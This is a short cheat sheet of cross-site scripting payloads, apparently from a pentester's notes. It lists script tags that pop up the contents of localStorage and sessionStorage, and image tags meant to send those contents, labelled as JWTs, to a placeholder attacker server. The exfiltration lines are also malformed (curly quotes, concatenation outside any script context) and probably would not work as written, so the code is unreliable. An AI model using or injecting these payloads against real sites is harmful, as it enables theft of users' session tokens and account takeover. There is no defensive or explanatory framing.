# localStorage in alert:
```html
<script>alert(JSON.stringify(localStorage))</script>
```
# sessionStorage in alert:
```html
<script>alert(JSON.stringify(sessionStorage))</script>
```
# localStorage stealing:
```html
<img src=’https://<attacker-server>/yikes?jwt=’+JSON.stringify(localStorage);’--!>
```
# sessionStorage stealing:
```html
<img src=’https://<attacker-server>/yikes?jwt=’+JSON.stringify(sessionStorage);’--!>
```
